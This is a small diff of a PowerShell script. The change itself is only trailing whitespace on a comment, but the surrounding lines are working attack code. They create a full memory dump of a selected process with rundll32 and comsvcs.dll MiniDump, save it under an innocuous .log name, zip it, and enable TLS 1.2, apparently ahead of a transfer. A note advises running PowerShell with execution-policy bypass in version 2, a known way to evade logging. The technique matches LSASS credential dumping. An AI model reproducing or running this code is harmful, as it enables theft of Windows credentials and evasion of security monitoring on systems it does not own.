@@ -22,7 +22,7 @@ $processes = Get-Process
 			rundll32 C:\Windows\System32\comsvcs.dll, MiniDump $dumpid $location\$env:COMPUTERNAME.log full | Out-Null
 		Compress-Archive -Path $location\$env:COMPUTERNAME.log -DestinationPath $location\$env:COMPUTERNAME.zip -CompressionLevel NoCompression
 
-#ENABLE TLS1.2 if you receive a message Regarding an ISSUE with TLS
+#ENABLE TLS1.2 if you receive a message Regarding an ISSUE with TLS   
 [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
 
 Execute Powershell with Exec bypass and stay in Version 2
